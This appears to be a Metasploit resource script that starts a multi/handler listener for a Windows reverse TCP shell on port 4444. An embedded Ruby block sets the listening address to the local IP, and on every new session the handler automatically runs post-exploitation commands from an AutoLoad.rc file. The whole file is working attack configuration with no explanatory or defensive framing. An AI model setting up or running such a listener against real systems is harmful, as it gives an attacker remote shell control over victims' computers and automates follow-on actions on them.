use multi/handler
set payload windows/shell/reverse_tcp
set LPORT 4444
<ruby>
var = Socket.ip_address_list[1].ip_address
run_single("set LHOST " + var)
</ruby>
set AutoRunScript multi_console_command -r AutoLoad.rc
run -j
